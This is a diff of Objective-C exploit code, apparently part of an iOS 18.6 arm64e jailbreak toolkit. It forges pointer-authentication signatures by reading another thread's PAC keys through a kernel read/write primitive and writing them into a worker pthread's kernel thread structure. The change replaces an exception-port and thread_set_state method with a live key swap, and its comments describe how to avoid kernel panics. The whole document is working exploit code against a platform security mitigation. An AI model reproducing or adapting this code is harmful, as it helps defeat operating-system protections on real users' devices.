@@ -105,105 +105,91 @@ static void kp_paccleanup(mach_port_t pacthread, mach_port_t excport, void *stac
     if (stack) free(stack);
 }
 
+// Live-pthread remotepac: a real pthread re-signs the pointer in a tight loop
+// with its own pacia. We swap its thread_t keys live; on the next context
+// switch the CPU reloads PAC keys from the machine context and the loop signs
+// with the REMOTE keys. No thread_set_state, no injected pc, no faults, no
+// exception ports — nothing for the kernel to poison or panic on.
+static volatile uint64_t g_pac_in_a;
+static volatile uint64_t g_pac_in_m;
+static volatile uint64_t g_pac_out;
+static volatile uint64_t g_pac_stop;
+
+__attribute__((noinline)) static void *kp_pacworker(void *arg)
+{
+    (void)arg;
+    while (!g_pac_stop) {
+        uint64_t a = g_pac_in_a;
+        uint64_t m = g_pac_in_m;
+        uint64_t v;
+        __asm__ volatile(
+            "mov x16, %[a]\n"
+            "mov x17, %[m]\n"
+            ".long 0xDAC10230\n"   // pacia x16, x17
+            "mov %[o], x16\n"
+            : [o] "=r"(v)
+            : [a] "r"(a), [m] "r"(m)
+            : "x16", "x17", "memory");
+        g_pac_out = v;
+    }
+    return NULL;
+}
+
 uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modifier)
 {
-    if (!g_rc_paciagadget) {
-        uint64_t gadgetaddr = kp_findpacia();
-        if (gadgetaddr == 0) return (uint64_t)-1;
-        g_rc_paciagadget = gadgetaddr;
-    }
-
     address = kp_pac_nativestrip(address);
 
     uint64_t keya = kp_rc_kread64(remotethreadaddr + KP_OFF_THREAD_MACHINE_ROP_PID);
     uint64_t keyb = kp_rc_kread64(remotethreadaddr + KP_OFF_THREAD_MACHINE_JOP_PID);
     paclog(@"    [rp] remote keys: a=%#llx b=%#llx", keya, keyb);
 
-    mach_port_t pacthread = MACH_PORT_NULL;
-    kern_return_t kr = thread_create(mach_task_self_, &pacthread);
-    if (kr != KERN_SUCCESS) { paclog(@"    [rp] thread_create kr=%#x", kr); return (uint64_t)-1; }
+    g_pac_in_a = address;
+    g_pac_in_m = modifier;
+    g_pac_out = 0;
+    g_pac_stop = 0;
 
-    void *stack = malloc(0x4000);
-    memset(stack, 0, 0x4000);
-    uint64_t sp = (uint64_t)(uintptr_t)stack + 0x2000;
+    pthread_t pt;
+    int prc = pthread_create(&pt, NULL, kp_pacworker, NULL);
+    if (prc) { paclog(@"    [rp] pthread_create rc=%d", prc); return (uint64_t)-1; }
+    pthread_detach(pt);
 
-    kp_arm_thread_state64_internal state;
-    memset(&state, 0, sizeof(state));
-    state.__sp = sp;
-    // iOS 18.6 arm64e: fetching a PAC-signed pc is FATAL (kernel SIGKILLs the
-    // task, no exception delivery). Raw canonical pc — the kernel signs the
-    // resume ELR itself; pacia then runs under the swapped (remote) keys.
-    state.__pc = g_rc_paciagadget;
-    // Raw unmapped lr: plain `ret` lands on 0x401 → ordinary EXC_BAD_ACCESS
-    // (not PAC-flavored) → catchable by our exception port.
-    state.__lr = KP_FAKE_LR;
-    state.__x[0]  = 0;
-    state.__x[1]  = address;
-    state.__x[2]  = modifier;
-    state.__x[3]  = (uint64_t)pacthread;
-    state.__x[16] = address;
-    state.__x[17] = modifier;
-    paclog(@"    [rp] state: pc=%#llx lr=%#llx sp=%#llx", state.__pc, state.__lr, state.__sp);
+    mach_port_t mp = pthread_mach_thread_np(pt);
+    uint64_t kva = [KPDump rcResolveThreadKVA:mp];
+    if (!kva) { paclog(@"    [rp] worker thread_t resolve FAIL"); g_pac_stop = 1; return 0; }
 
-    // resolve pacthread's kernel thread_t VA (lara order): threadsetstate
-    // needs it for the TH_IN_MACH_EXCEPTION dance, then we swap keys on it.
-    uint64_t pacKVA = [KPDump rcResolveThreadKVA:pacthread];
-    if (!pacKVA) { paclog(@"    [rp] pacKVA resolve FAIL"); kp_paccleanup(pacthread, MACH_PORT_NULL, stack); return 0; }
+    uint64_t oa = kp_rc_kread64(kva + KP_OFF_THREAD_MACHINE_ROP_PID);
+    uint64_t ob = kp_rc_kread64(kva + KP_OFF_THREAD_MACHINE_JOP_PID);
+    paclog(@"    [rp] worker orig keys: a=%#llx b=%#llx — %@", oa, ob,
+           (oa == keya && ob == keyb) ? @"совпадают с remote (per-task)" : @"ДРУГИЕ (per-thread/lazy)");
 
-    uint64_t oa = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_ROP_PID);
-    uint64_t ob = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_JOP_PID);
-    paclog(@"    [rp] pacthread orig keys: a=%#llx b=%#llx — %@", oa, ob,
-           (oa == keya && ob == keyb) ? @"совпадают с main (per-task)" : @"ДРУГИЕ (per-thread!)");
+    // baseline: worker signs with its own keys
+    for (int i = 0; i < 500 && !g_pac_out; i++) usleep(1000);
+    uint64_t baseline = g_pac_out;
+    paclog(@"    [rp] baseline (свои ключи): %#llx", baseline);
 
-    uint16_t opt0 = kp_rc_kread16(pacKVA + KP_OFF_THREAD_OPTIONS);
-    kp_rc_kwrite16(pacKVA + KP_OFF_THREAD_OPTIONS, opt0 | KP_TH_IN_MACH_EXCEPTION);
-    uint16_t opt1 = kp_rc_kread16(pacKVA + KP_OFF_THREAD_OPTIONS);
-    paclog(@"    [rp] options: %#x → %#x (флаг %@)", opt0, opt1,
-           (opt1 & KP_TH_IN_MACH_EXCEPTION) ? @"ЗАПИСАЛСЯ" : @"НЕ ПРИЛИП!");
-
-    kr = thread_set_state(pacthread, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT);
-    paclog(@"    [rp] thread_set_state kr=%#x", kr);
-    kp_rc_kwrite16(pacKVA + KP_OFF_THREAD_OPTIONS, opt0);
-    if (kr != KERN_SUCCESS) { kp_paccleanup(pacthread, MACH_PORT_NULL, stack); return 0; }
-
-    // swap pacthread's PAC keys for the remote thread's keys
-    kp_threadsetpac(pacKVA, keya, keyb);
-    uint64_t ra = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_ROP_PID);
-    uint64_t rb = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_JOP_PID);
+    // live key swap — next context switch reloads them into CPU regs
+    kp_threadsetpac(kva, keya, keyb);
+    uint64_t ra = kp_rc_kread64(kva + KP_OFF_THREAD_MACHINE_ROP_PID);
+    uint64_t rb = kp_rc_kread64(kva + KP_OFF_THREAD_MACHINE_JOP_PID);
     paclog(@"    [rp] keys после swap: a=%#llx b=%#llx — %@", ra, rb,
            (ra == keya && rb == keyb) ? @"прилипли" : @"НЕ ПРИЛИПЛИ!");
 
-    kr = thread_resume(pacthread);
-    paclog(@"    [rp] resume kr=%#x — спин-сэмпл через 30мс…", kr);
-    if (kr != KERN_SUCCESS) { kp_paccleanup(pacthread, MACH_PORT_NULL, stack); return 0; }
+    uint64_t newsig = baseline;
+    for (int i = 0; i < 300; i++) {
+        usleep(1000);
+        if (g_pac_out != baseline) { newsig = g_pac_out; break; }
+    }
+    newsig = g_pac_out;
+    paclog(@"    [rp] после swap (remote ключи): %#llx — %@", newsig,
+           newsig != baseline ? @"ИЗМЕНИЛАСЬ — ключи перезагрузились по живому!" : @"не изменилась за 300мс");
 
-    // Spin-гаджет: pacia уже выполнилась, поток крутится в `b .`. Никаких
-    // fault'ов на всём пути — exception-порты не нужны вообще.
-    usleep(30000);
+    // restore original keys before the worker exits (dies clean, no zone panic)
+    kp_threadsetpac(kva, oa, ob);
+    uint64_t ra2 = kp_rc_kread64(kva + KP_OFF_THREAD_MACHINE_ROP_PID);
+    uint64_t rb2 = kp_rc_kread64(kva + KP_OFF_THREAD_MACHINE_JOP_PID);
+    paclog(@"    [rp] restore: %@", (ra2 == oa && rb2 == ob) ? @"вернули" : @"НЕ ВЕРНУЛИ!");
 
-    kr = thread_suspend(pacthread);
-    paclog(@"    [rp] suspend kr=%#x", kr);
-
-    kp_arm_thread_state64_internal got;
-    memset(&got, 0, sizeof(got));
-    mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
-    kern_return_t gkr = thread_get_state(pacthread, ARM_THREAD_STATE64, (thread_state_t)&got, &cnt);
-    paclog(@"    [rp] get_state kr=%#x: pc=%#llx x16=%#llx x0=%#llx", gkr,
-           got.__pc, got.__x[16], got.__x[0]);
-
-    uint64_t signedAddress = got.__x[16];
-
-    // restore pacthread's ORIGINAL machine keys + options before terminate —
-    // a thread that dies with our swapped-in fields makes the kernel mis-free
-    // a machine object (zone panic data.kalloc.32 vs kalloc.type1.1024).
-    kp_threadsetpac(pacKVA, oa, ob);
-    kp_rc_kwrite16(pacKVA + KP_OFF_THREAD_OPTIONS, opt0);
-    uint64_t ra2 = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_ROP_PID);
-    uint64_t rb2 = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_JOP_PID);
-    uint16_t opt2 = kp_rc_kread16(pacKVA + KP_OFF_THREAD_OPTIONS);
-    paclog(@"    [rp] restore: keys %@ options %#x — terminate",
-           (ra2 == oa && rb2 == ob) ? @"вернули" : @"НЕ ВЕРНУЛИ!", opt2);
-
-    kp_paccleanup(pacthread, MACH_PORT_NULL, stack);
-    return signedAddress;
+    g_pac_stop = 1;
+    for (int i = 0; i < 100; i++) usleep(1000); // let the worker see the flag and exit
+    return newsig;
 }
